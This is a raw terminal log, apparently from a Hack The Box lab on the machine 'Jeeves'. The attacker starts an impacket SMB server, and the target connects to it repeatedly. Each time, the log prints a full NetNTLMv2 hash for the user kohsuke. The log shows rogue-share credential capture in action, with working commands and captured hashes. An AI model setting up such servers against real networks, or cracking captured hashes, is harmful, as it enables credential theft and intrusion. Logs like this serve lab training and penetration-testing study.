┌─[root@parrot]─[~/hackthebox/jeeves]       
└──╼ #mkdir smb       
┌─[root@parrot]─[~/hackthebox/jeeves]       
└──╼ #cd smb/         
┌─[root@parrot]─[~/hackthebox/jeeves/smb]   
└──╼ #impacket-smbserver arrow `pwd`        
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation                                 

[*] Config file parsed                      
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0                   
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0                   
[*] Config file parsed                      
[*] Config file parsed                      
[*] Config file parsed                      
[*] Incoming connection (10.10.10.63,49680) 
[*] AUTHENTICATE_MESSAGE (JEEVES\kohsuke,JEEVES)                                         
[*] User JEEVES\kohsuke authenticated successfully                                       
[*] kohsuke::JEEVES:4141414141414141:169feb7d28708b6a191777f2b2ccd679:010100000000000000ff4d3885c3d5016f21e16e42dbaf87000000000100100051004c00590061004900630045004c000300100051004c00590061004900630045004c00020010006600530072006f0049004d0073006800040010006600530072006f0049004d00730068000700080000ff4d3885c3d50106000400020000000800300030000000000000000000000000300000d368396cdbafb2206654656400acd29c40ca4976aad197c873ca7d68dfb598600a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e0031003400000000000000000000000000            
[*] Disconnecting Share(1:IPC$)             
[*] Disconnecting Share(2:ARROW)            
[*] Handle: 'ConnectionResetError' object is not subscriptable                           
[*] Closing down connection (10.10.10.63,49680)                                          
[*] Remaining connections []                
[*] Incoming connection (10.10.10.63,49681) 
[*] AUTHENTICATE_MESSAGE (JEEVES\kohsuke,JEEVES)                                         
[*] User JEEVES\kohsuke authenticated successfully                                       
[*] kohsuke::JEEVES:4141414141414141:78255f937231367904158e80fb6ed609:01010000000000008008db5d85c3d50112d12f1bac65cdd9000000000100100051004c00590061004900630045004c000300100051004c00590061004900630045004c00020010006600530072006f0049004d0073006800040010006600530072006f0049004d0073006800070008008008db5d85c3d50106000400020000000800300030000000000000000000000000300000d368396cdbafb2206654656400acd29c40ca4976aad197c873ca7d68dfb598600a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e0031003400000000000000000000000000            
[*] Disconnecting Share(1:ARROW)            
[*] AUTHENTICATE_MESSAGE (JEEVES\kohsuke,JEEVES)                                         
[*] User JEEVES\kohsuke authenticated successfully                                       
[*] kohsuke::JEEVES:4141414141414141:ece784ff11497f75045ca29c7b2e2893:0101000000000000805f817485c3d50110b58a26e0f86703000000000100100051004c00590061004900630045004c000300100051004c00590061004900630045004c00020010006600530072006f0049004d0073006800040010006600530072006f0049004d007300680007000800805f817485c3d50106000400020000000800300030000000000000000000000000300000d368396cdbafb2206654656400acd29c40ca4976aad197c873ca7d68dfb598600a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e0031003400000000000000000000000000            
[*] Disconnecting Share(1:ARROW)            
[*] Handle: 'ConnectionResetError' object is not subscriptable                           
[*] Closing down connection (10.10.10.63,49681)                                          
[*] Remaining connections []                
[*] Incoming connection (10.10.10.63,49682) 
[*] AUTHENTICATE_MESSAGE (JEEVES\kohsuke,JEEVES)                                         
[*] User JEEVES\kohsuke authenticated successfully                                       
[*] kohsuke::JEEVES:4141414141414141:69b01b71490a2148380f929aea8f1029:0101000000000000803affa285c3d5010d7255de364e6971000000000100100051004c00590061004900630045004c000300100051004c00590061004900630045004c00020010006600530072006f0049004d0073006800040010006600530072006f0049004d007300680007000800803affa285c3d50106000400020000000800300030000000000000000000000000300000d368396cdbafb2206654656400acd29c40ca4976aad197c873ca7d68dfb598600a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e0031003400000000000000000000000000            
[*] Disconnecting Share(1:ARROW)            
[*] Handle: 'ConnectionResetError' object is not subscriptable                           
[*] Closing down connection (10.10.10.63,49682)                                          
[*] Remaining connections []                
[*] Incoming connection (10.10.10.63,49683) 
[*] AUTHENTICATE_MESSAGE (JEEVES\kohsuke,JEEVES)                                         
[*] User JEEVES\kohsuke authenticated successfully                                       
[*] kohsuke::JEEVES:4141414141414141:3bafbee38da29c788fde5b9b3d4b18dd:0101000000000000806e495d93c3d501711e4db119fc8bc8000000000100100051004c00590061004900630045004c000300100051004c00590061004900630045004c00020010006600530072006f0049004d0073006800040010006600530072006f0049004d007300680007000800806e495d93c3d50106000400020000000800300030000000000000000000000000300000d368396cdbafb2206654656400acd29c40ca4976aad197c873ca7d68dfb598600a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e0031003400000000000000000000000000            
[*] Disconnecting Share(1:IPC$)             
[*] Disconnecting Share(2:ARROW)            
[*] Handle: 'ConnectionResetError' object is not subscriptable                           
[*] Closing down connection (10.10.10.63,49683)                                          
[*] Remaining connections []                
[*] Incoming connection (10.10.10.63,49685) 
[*] AUTHENTICATE_MESSAGE (JEEVES\kohsuke,JEEVES)                                         
[*] User JEEVES\kohsuke authenticated successfully                                       
[*] kohsuke::JEEVES:4141414141414141:b68de5cfeb122fce69a2c64536bd0865:010100000000000080501e5995c3d501e7c72ce9f9f38d61000000000100100051004c00590061004900630045004c000300100051004c00590061004900630045004c00020010006600530072006f0049004d0073006800040010006600530072006f0049004d00730068000700080080501e5995c3d50106000400020000000800300030000000000000000000000000300000d368396cdbafb2206654656400acd29c40ca4976aad197c873ca7d68dfb598600a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e0031003400000000000000000000000000            
[*] Disconnecting Share(1:ARROW)            
[*] AUTHENTICATE_MESSAGE (JEEVES\kohsuke,JEEVES)                                         
[*] User JEEVES\kohsuke authenticated successfully                                       
[*] kohsuke::JEEVES:4141414141414141:cbbf68410cb4ae4d692e017798b9ba1e:01010000000000008096e17c95c3d5012f8e9f3e894b7105000000000100100051004c00590061004900630045004c000300100051004c00590061004900630045004c00020010006600530072006f0049004d0073006800040010006600530072006f0049004d0073006800070008008096e17c95c3d50106000400020000000800300030000000000000000000000000300000d368396cdbafb2206654656400acd29c40ca4976aad197c873ca7d68dfb598600a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e0031003400000000000000000000000000            
[*] Disconnecting Share(1:IPC$)             
[*] Disconnecting Share(2:ARROW)            
[*] Handle: 'ConnectionResetError' object is not subscriptable                           
[*] Closing down connection (10.10.10.63,49685)                                          
[*] Remaining connections []                
